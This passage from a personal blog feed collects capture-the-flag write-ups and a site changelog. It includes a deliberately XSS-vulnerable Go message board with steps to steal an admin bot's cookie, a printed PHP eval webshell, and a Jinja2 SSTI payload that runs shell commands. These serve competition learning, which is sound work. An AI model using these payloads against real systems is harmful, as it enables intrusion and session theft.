class="line">	lock     sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	username := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	password := c.PostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> storedPassword, ok := users[username]; ok &amp;&amp; storedPassword == password &#123;</span><br><span class="line">		session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">		session.Values[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">		session.Options = &amp;sessions.Options&#123;</span><br><span class="line">			Path:     <span class="string">&quot;/&quot;</span>,</span><br><span class="line">			MaxAge:   <span class="number">3600</span>,</span><br><span class="line">			HttpOnly: <span class="literal">false</span>,</span><br><span class="line">			Secure:   <span class="literal">false</span>,</span><br><span class="line">		&#125;</span><br><span class="line">		session.Save(c.Request, c.Writer)</span><br><span class="line">		c.String(http.StatusOK, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	log.Printf(<span class="string">&quot;Login failed for user: %s\n&quot;</span>, username)</span><br><span class="line">	c.String(http.StatusUnauthorized, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logoutHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">	<span class="built_in">delete</span>(session.Values, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">	session.Save(c.Request, c.Writer)</span><br><span class="line">	c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">	username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;User not logged in, redirecting to login&quot;</span>)</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Request.Method == http.MethodPost &#123;</span><br><span class="line">		comment := c.PostForm(<span class="string">&quot;comment&quot;</span>)</span><br><span class="line">		log.Printf(<span class="string">&quot;New comment submitted: %s\n&quot;</span>, comment)</span><br><span class="line">		comments = <span class="built_in">append</span>(comments, comment)</span><br><span class="line">	&#125;</span><br><span class="line">	htmlContent := fmt.Sprintf(<span class="string">`&lt;html&gt;</span></span><br><span class="line"><span class="string">		&lt;body&gt;</span></span><br><span class="line"><span class="string">			&lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">			&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;</span></span><br><span class="line"><span class="string">			&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">				&lt;textarea name=&quot;comment&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">				&lt;input type=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;/form&gt;</span></span><br><span class="line"><span class="string">			&lt;h3&gt;留言:&lt;/h3&gt;</span></span><br><span class="line"><span class="string">			&lt;ul&gt;`</span>, username)</span><br><span class="line">	<span class="keyword">for</span> _, comment := <span class="keyword">range</span> comments &#123;</span><br><span class="line">		htmlContent += <span class="string">&quot;&lt;li&gt;&quot;</span> + comment + <span class="string">&quot;&lt;/li&gt;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	htmlContent += <span class="string">`&lt;/ul&gt;</span></span><br><span class="line"><span class="string">			&lt;p&gt;&lt;a href=&quot;/logout&quot;&gt;退出&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">		&lt;/body&gt;</span></span><br><span class="line"><span class="string">	&lt;/html&gt;`</span></span><br><span class="line">	c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adminHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	htmlContent := <span class="string">`&lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;</span></span><br><span class="line"><span class="string">		&lt;/body&gt;&lt;/html&gt;`</span></span><br><span class="line">	c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line">	<span class="comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		lock.Lock()</span><br><span class="line">		<span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">		ctx, cancel := chromedp.NewContext(context.Background())</span><br><span class="line">		<span class="keyword">defer</span> cancel()</span><br><span class="line">		ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line">		<span class="keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Println(<span class="string">&quot;Chromedp error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无头浏览器操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myTasks</span><span class="params">()</span></span> chromedp.Tasks &#123;</span><br><span class="line">	<span class="keyword">return</span> chromedp.Tasks&#123;</span><br><span class="line">		chromedp.Navigate(<span class="string">&quot;/login&quot;</span>),</span><br><span class="line">		chromedp.WaitVisible(<span class="string">`input[name=&quot;username&quot;]`</span>),</span><br><span class="line">		chromedp.SendKeys(<span class="string">`input[name=&quot;username&quot;]`</span>, <span class="string">&quot;admin&quot;</span>),</span><br><span class="line">		chromedp.SendKeys(<span class="string">`input[name=&quot;password&quot;]`</span>, <span class="string">&quot;fake_password&quot;</span>),</span><br><span class="line">		chromedp.Click(<span class="string">`input[type=&quot;submit&quot;]`</span>),</span><br><span class="line">		chromedp.Navigate(<span class="string">&quot;/&quot;</span>),</span><br><span class="line">		chromedp.Sleep(<span class="number">5</span> * time.Second),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	log.Println(<span class="string">&quot;Handling flag request&quot;</span>)</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusInternalServerError, <span class="string">&quot;无法获取会话&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line">	<span class="keyword">if</span> !ok || username != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		c.String(http.StatusForbidden, <span class="string">&quot;只有admin才可以访问哦&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">&quot;Admin accessed the flag&quot;</span>)</span><br><span class="line">	c.String(http.StatusOK, flag)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">	r.POST(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">	r.GET(<span class="string">&quot;/logout&quot;</span>, logoutHandler)</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, indexHandler)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, adminHandler)</span><br><span class="line">	r.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">	log.Println(<span class="string">&quot;Server started at :8888&quot;</span>)</span><br><span class="line">	log.Fatal(r.Run(<span class="string">&quot;:8888&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>简单的 XSS 。</p>
<p>Dirsearch 扫一下可以扫到 <code>/admin</code> , 应该是 call 机器人访问</p>
<p>随便找个 XSS 平台在评论里投个毒即可拿到 admin 的 cookie</p>
<p>拿到 cookie 访问 <code>/flag</code> 即可。</p>
<hr>
<h2 id="Misc">Misc</h2>
<h3 id="Hakuya-Want-A-Girl-Friend">Hakuya Want A Girl Friend</h3>
<blockquote>
<p>又到了一年一度的HGAME了，遵循前两年的传统，寻找（献祭）一个单身成员拿来出题🥵🥵。</p>
<p>前两年的都成了，希望今年也能成🙏。</p>
</blockquote>
<p>下载的 txt 里面是一个 zip 压缩包的 hex ，同时注意到文件尾部藏了翻转了字节的 PNG 。</p>
<p>分离 zip ，里面是 flag ，但是有密码。</p>
<p>研究 png ，脚本复原：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_data = f.read().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    reversed_hex_data = <span class="string">&#x27;&#x27;</span>.join([hex_data[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_data), <span class="number">2</span>)][::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>.fromhex(reversed_hex_data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_file = <span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">output_file = <span class="built_in">input</span>(<span class="string">&quot;output:&quot;</span>)</span><br><span class="line">reverse_hex_file(input_file, output_file)</span><br></pre></td></tr></table></figure>
<p>分离出来的 png 存在宽高隐写，改高度秒了，得到 passwd</p>
<p>passwd: <code>To_f1nd_th3_QQ</code></p>
<p>flag: <code>hagme&#123;h4kyu4_w4nt_gir1f3nd_+q_xxxxxxxxx&#125;</code></p>
<h3 id="Computer-cleaner">Computer cleaner</h3>
<blockquote>
<p>小明的虚拟机好像遭受了攻击，你可以帮助他清理一下他的电脑吗</p>
<p>找到攻击者的webshell连接密码对攻击者进行简单溯源排查攻击者目的附件：<a href="https://pan.baidu.com/s/1pUtcyTAykio1Ti0utGI-BA?pwd=vid4">https://pan.baidu.com/s/1pUtcyTAykio1Ti0utGI-BA?pwd=vid4</a> 提取码: vid4</p>
<p>onedrive下载：<a href="https://1drv.ms/u/c/ad1d293564fdb7f1/EbQBbX_kCvlOkZbZOkmk7sQBE7lQu9pBrzGc8B03LanXgg?e=o1LLIb">https://1drv.ms/u/c/ad1d293564fdb7f1/EbQBbX_kCvlOkZbZOkmk7sQBE7lQu9pBrzGc8B03LanXgg?e=o1LLIb</a></p>
<p>压缩包密码：26c48b80-a1ec-4710-b26d-72dc75550d4b</p>
<p>虚拟机密码：vviiddaarr</p>
</blockquote>
<p>简单的排查。</p>
<p>题干都说是 webshell 了，果断查找 <code>/var/www/html</code></p>
<p><code>./uploads</code> 里有个🐎</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hgame&#123;y0u_&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>./upload_log.txt</code> 里有攻击者的 ip</p>
<p>访问得到 flag2 <code>hav3_cleaned_th3</code></p>
<p><code>/home/Documents</code> 里有 flag3 <code>_c0mput3r!&#125;</code></p>
<p>拼接 , flag : <code>hgame&#123;y0u_hav3_cleaned_th3_c0mput3r!&#125;</code></p>
<hr>
<h2 id="Reverse">Reverse</h2>
<h3 id="Compress-dot-new">Compress dot new</h3>
<blockquote>
<p>有时候逆向工程并不需要使用非常复杂的工具：一人、一桌、一电脑、一记事本、一数字帮手足矣。</p>
<p>附件备用链接：<a href="https://1drv.ms/u/c/a62edaf3b21e7091/ETgNGWjXMyRArwzcTurWXvAB-b6CiC2sK_CU0l6LeSjDtA?e=4%3ay07Jgn">https://1drv.ms/u/c/a62edaf3b21e7091/ETgNGWjXMyRArwzcTurWXvAB-b6CiC2sK_CU0l6LeSjDtA?e=4%3Ay07Jgn</a></p>
</blockquote>
<p><s>好，我用数字帮手</s></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取enc.txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read().split(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    json_tree = content[<span class="number">0</span>]</span><br><span class="line">    binary_str = content[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析霍夫曼树</span></span><br><span class="line">huffman_tree = json.loads(json_tree)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码二进制字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_huffman</span>(<span class="params">binary_str, root</span>):</span><br><span class="line">    result = []</span><br><span class="line">    current_node = root</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> binary_str:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> current_node:</span><br><span class="line">            result.append(current_node[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">            current_node = root  <span class="comment"># 重置到根节点继续解码</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">decoded_symbols = decode_huffman(binary_str, huffman_tree)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为原始文本</span></span><br><span class="line">original_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> decoded_symbols)</span><br><span class="line"><span class="built_in">print</span>(original_text)</span><br></pre></td></tr></table></figure>
<p>flag : <code>hgame&#123;Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!&#125;</code></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Competition</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎来到我的兔子洞🎉🎉🎉</title>
    <url>/2024/11/19/index/</url>
    <content><![CDATA[<h1>欢迎来到我的兔子洞🎉🎉🎉</h1>
<p>这里是 k0relapse 的个人博客。</p>
<p>本页主要发布更新日志，更多信息请移步 about 页面。</p>
<hr>
<h2>Log</h2>
<h3 id="·-25-02-23-11-40-00">· 25-02-23 11:40:00</h3>
<p>增加了随机头图功能。</p>
<p><s>又可以看到大禀老师真是太好了嘿嘿嘿🤤</s></p>
<h3 id="·-25-01-04-23-34-20">· 25-01-04 23:34:20</h3>
<p>更改了代码块主题。</p>
<p>虽然观感感觉会变得没有那么和谐，但是阅读体验会好很多。</p>
<h3 id="·-25-01-03-22-56-03">· 25-01-03 22:56:03</h3>
<p>增加 <code>Twikoo</code> 评论系统。</p>
<h3 id="·-25-01-03-18-00-30">· 25-01-03 18:00:30</h3>
<p>增加一些透明材质。</p>
<p>同时更改了 APlayer 样式。</p>
<h3 id="·-25-01-03-13-23-30">· 25-01-03 13:23:30</h3>
<p>换用 <code>vercel</code> 部署，巨幅加快访问速度。</p>
<h3 id="·-25-01-03-00-31-00">· 25-01-03 00:31:00</h3>
<p>改了一下加载背景。</p>
<h3 id="·-25-01-02-23-27-50">· 25-01-02 23:27:50</h3>
<p>给大禀老师放个假😋</p>
<h3 id="·-24-12-13-22-15-00">· 24-12-13 22:15:00</h3>
<p>增加了搜索功能。</p>
<p>顺便把烦人的烟花特效给关了。</p>
<h3 id="·-24-12-10-23-41-05">· 24-12-10 23:41:05</h3>
<p>增加了评论功能。</p>
<p>过几天有时间把搜索功能也做上。</p>
<h3 id="·-24-11-30-23-17-00">· 24-11-30 23:17:00</h3>
<p>粉色入侵背景图！</p>
<h3 id="·-24-11-28-19-59-00">· 24-11-28 19:59:00</h3>
<p>修复了部分页面图片缺失的问题，顺便对一些图片进行了替换。</p>
<p><code>Gallery</code> 图片更新。</p>
<p>启用了 <code>Tags</code> 与 <code>Categories</code> 页面。<br>
<s><em>虽然目前并没有什么用处</em></s></p>
<h3 id="·-24-11-27-13-09-40">· 24-11-27 13:09:40</h3>
<p>优化了一下访问速度以及 Gallery 页面的占用，今后应该不会再新增什么功能了。</p>
<h3 id="·-24-11-22-20-09-00">· 24-11-22 20:09:00</h3>
<p>修复了上下篇文章按钮的错位问题，点名批评 pangu.js 。</p>
<h3 id="·-24-11-21-23-41-30">· 24-11-21 23:41:30</h3>
<p>大幅优化图片大小，加快加载速度</p>
<p>Gallery 上线，<strong>访问时请注意设备性能与网络状况！</strong></p>
<h3 id="·-24-11-21-13-38-30">· 24-11-21 13:38:30</h3>
<p>再次优化访问速度，修复了一处 bug 。</p>
<h3 id="·-24-11-21-08-32-00">· 24-11-21 08:32:00</h3>
<p>狠心把老婆们换成了 webp 格式，大幅加快访问速度。</p>
<p>之后会对文章中的插图也进行替换。</p>
<h3 id="·-24-11-20-23-37-00">· 24-11-20 23:37:00</h3>
<p>添加了静态鼠标指针。</p>
<h3 id="·-24-11-20-23-05-30">· 24-11-20 23:05:30</h3>
<p>添加了樱花粒子效果。</p>
<h3 id="·-24-11-20-14-20-00">· 24-11-20 14:20:00</h3>
<p>修复了 md 中的问题。</p>
<h3 id="·-24-11-20-13-47-00">· 24-11-20 13:47:00</h3>
<p>使用<code>gulp</code>优化了一下响应速度， <s>成功的将响应速度从 100 年缩短到了 50 年！</s></p>
<p><s>图片是不可能压的，这辈子都不可能😡，我 k0relapse 就算一张图片都加载不出来，也绝对不可能压缩我的老婆们！</s> <s><em>快进到真香</em></s>  真香</p>
<h3 id="·-24-11-20-11-00-00">· 24-11-20 11:00:00</h3>
<p><s>博客可以投入使用了，暂时不会再加什么新特性。</s> 不你还不可以</p>
<p>发现一些 md 中存在问题，晚点修复。</p>
<h3 id="·-24-11-19-16-03-30">· 24-11-19 16:03:30</h3>
<p>随便上传几个之前的wp看下吧。</p>
<p><s><em>该死的语雀不能导出打包带图片的md，害得我整了半天还丢了图片大小信息</em></s></p>
<h3 id="·-24-11-19">· 24-11-19</h3>
<p>k0relapse 的个人博客终于完工了，本站基于 Butterfly 主题构建。</p>
<h3 id="·-24-11-18">· 24-11-18</h3>
<p>由梦说搞Chripy好麻烦，叫我试试用 Hexo 搭建博客。</p>
<h3 id="·-24-11-17">· 24-11-17</h3>
<p>k0relapse 正式开始施工了，先试试 JekyII.</p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>强网青少 2024 创新赛 WriteUp</title>
    <url>/2024/12/10/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%202024%20%E5%AE%9E%E8%B7%B5%E8%B5%9BWriteUp/</url>
    <content><![CDATA[<h1>强网青少 2024 创新赛 WriteUp</h1>
<p>题目资源：<a href="https://github.com/CTF-Archives/2024-qwqsncx/tree/main?tab=readme-ov-file">https://github.com/CTF-Archives/2024-qwqsncx/tree/main?tab=readme-ov-file</a></p>
<h2 id="说在前面">说在前面</h2>
<p>第一次参加这种线下赛，非常新鲜。</p>
<p>除去因为我是🥬🐶，没有拿到二等这件事，参加这个竞赛还是挺开心的。</p>
<p><s>被各路大神当人机刷了呜呜呜</s></p>
<p>大家都不看好我，偏偏我也不争气 .jpg</p>
<p>权当旅游了吧，跑快 2000 公里出勤顺便打个比赛，嗯就这么理解。</p>
<p>回到这次题目本身，创新赛题目本身非常简单，但是这个让选手抱着电脑四处跑的操作是哪位天才想出来的😡</p>
<p>到处跑就算了，做题点还没有插线板充电，痛失 2000 分😡</p>
<p>创新得很好，建议下次别创了。</p>
<h2 id="机床故障排查">机床故障排查</h2>
<p>流量分析题。</p>
<p>题目要求是分析流量包，找到使机床发动机产生故障的发动机转速的流量包。</p>
<p>转速都明文记载在流量包中， wireshark 打开分析即可。</p>
<p>异常流量包：437 转速：21405</p>
<p>flag{意气风发}</p>
<h2 id="WiFi-破解">WiFi 破解</h2>
<p>题目有给一个网址，似乎是一个路由器的网关，还给了一个爆破密码的字典</p>
<p>甚至提示了用户名是 admin</p>
<p>提交一次登录请求，Yakit Web Fuzzer 打开分析，发现用户名明文传输，而密码则传的是 sha256</p>
<p>思路非常简单，将字典每一个密码的 sha256 传上去爆破即可，写个脚本即可实现。</p>
<h2 id="AI-智能工厂">AI 智能工厂</h2>
<pre><code>花斯卡~ 火斯卡~
</code></pre>
<p>智能工厂✖️ AI✔️</p>
<p>没什么好说的，这个 AI 题可以和 SHCTF 的 AI 坐一桌。</p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Competition</tag>
      </tags>
  </entry>
  <entry>
    <title>春秋杯 2024 冬季 WriteUp</title>
    <url>/2025/01/20/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%20WriteUp/</url>
    <content><![CDATA[<h1>春秋杯 2024 冬季 WriteUp</h1>
<hr>
<h2 id="说在前面">说在前面</h2>
<p>被拉出去练了两天车，成人干了。</p>
<p>基本上都是早上打的比赛，没多少时间去做题，有些需要时间的题就没有去做。</p>
<p>春秋这个平台恶心的一点就是赛后不开环境去复现，这里就凭记忆写点 wp 吧。</p>
<hr>
<h2 id="Misc">Misc</h2>
<h3 id="See-anything-in-these-pics">See anything in these pics</h3>
<p>扫描 aztec.png 可以得到压缩包密码。</p>
<p>解压得到的图片内藏了另一张图片， 010 提取 。</p>
<p>发现全黑，注意到图片的 CRC 有问题，用脚本算宽高得到原始宽高为 1440x1800 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crc = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8192</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8192</span>):</span><br><span class="line">        data = crc[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0xEF1B39BE</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure>
<p>改宽高，图片中得到 flag 。</p>
<h3 id="简单镜像提取">简单镜像提取</h3>
<p>流量包里提取出镜像文件，使用 R-Studio 恢复得到一个 xlsx 。</p>
<p>打开即可得到 flag 。</p>
<h3 id="音频的秘密">音频的秘密</h3>
<p>题目给了一个 wav 文件，频谱没毛病，大概率 Deepsound 。</p>
<p>有密码， hint 提示是弱口令，爆破出密码是 <code>123</code> .</p>
<p>提取出来一个压缩包，藏了一张 png 图片，带加密，爆破不出。</p>
<p>注意到加密方式为 <code>ZipCrypto Store</code> 。可以使用明文破解。</p>
<p>破解得到 png 是 lsb 隐写，提取即可得到 flag 。</p>
<h3 id="Weevil’s-Whisper">Weevil’s Whisper</h3>
<p>分析流量包，注意到一个🐎</p>
<p>分析🐎的利用方式，可以整一个脚本解密流量包中传的信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">k = <span class="string">b&quot;161ebd7d&quot;</span></span><br><span class="line">kh = <span class="string">&quot;45089b3446ee&quot;</span></span><br><span class="line">kf = <span class="string">&quot;4e0d86dbcf92&quot;</span></span><br><span class="line">p = <span class="string">&quot;lFDu8RwONqmag5ex&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    decrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        decrypted_data.append(data[i] ^ key[i % key_len])</span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decompressed_data = zlib.decompress(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompressed Payload:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> decompressed_data</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error decompressing payload: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python decrypt_backdoor.py &lt;encoded_payload&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    encoded_payload = sys.argv[<span class="number">1</span>].replace(p, <span class="string">&#x27;&#x27;</span>).replace(kh, <span class="string">&#x27;&#x27;</span>).replace(kf, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Step 1: Base64 Decode</span></span><br><span class="line">    decoded_payload = base64.b64decode(encoded_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Step 2: XOR Decrypt</span></span><br><span class="line">    decrypted_payload = xor_decrypt(decoded_payload, k)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Step 3: Decompress</span></span><br><span class="line">    result = decompress(decrypted_payload.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>在包 289 发现 flag .</p>
<p><code>flag&#123;arsjxh-sjhxbr-3rdd78dfsh-3ndidjl&#125;</code></p>
<hr>
<h2 id="Crypto">Crypto</h2>
<h3 id="通往哈希的旅程">通往哈希的旅程</h3>
<p>hashcat 掩码爆破即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 100 ca12fd8250972ec363a16593356abb1f3cf3a16d 188?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Web">Web</h2>
<h3 id="easy-flask">easy_flask</h3>
<p>最简单的 jinja2 ssti .</p>
<p><code>&#123;&#123;lipsum.__globals__['o'+'s']['pop''en']('cat flag').read()&#125;&#125;</code></p>
<p>打过去得到 flag 。</p>
<h3 id="easy-php-复现">easy_php (复现)</h3>
